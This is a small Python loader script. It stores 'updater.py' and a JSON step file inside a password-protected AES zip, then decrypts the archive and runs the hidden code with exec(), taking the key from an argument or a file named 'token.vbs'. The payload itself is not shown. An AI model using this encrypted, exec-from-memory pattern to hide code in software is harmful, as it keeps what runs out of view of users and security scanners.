import sys
import time
import pyzipper
from pathlib import Path

BASE = Path(__file__).resolve().parent
ZIP = BASE / "updater.zip"
UPDATER = BASE / "updater.py"
STEPS = BASE / "repo.json"


if len(sys.argv) > 1:
    token = sys.argv[1]
else:
    token = (BASE / "token.vbs").read_text().strip()


try:
    if not ZIP.exists():
    #if True:
        with pyzipper.AESZipFile(ZIP, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as z:
            z.setpassword(token.encode())
            z.setencryption(pyzipper.WZ_AES, nbits=256)
            z.write(UPDATER, "updater.py")
            z.write(STEPS, "repo.json")

    with pyzipper.AESZipFile(ZIP) as z:
        z.setpassword(token.encode())
        code = z.read("updater.py").decode("utf-8")
        sys.argv.extend([z.read("repo.json").decode("utf-8")])

    exec(compile(code, str(UPDATER), "exec"), {"__name__": "__main__", "__file__": str(UPDATER)})

except Exception as e:
    print(f"Error: {e}")

time.sleep(10)